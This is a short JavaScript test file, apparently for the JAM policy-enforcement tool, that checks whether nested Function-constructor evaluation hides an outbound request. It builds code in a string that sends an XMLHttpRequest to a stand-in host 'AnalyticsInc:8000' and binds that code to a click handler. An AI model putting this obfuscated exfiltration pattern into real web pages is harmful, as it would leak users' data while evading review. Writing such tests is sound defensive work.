// exfil_test_func_nested.js
function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest", true);xmlhttp.send(null);\';return Function(exp);';
  var top$$2 = JAM.call(Function, null, [nest]);
  var sub = top$$2();
  sub();
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
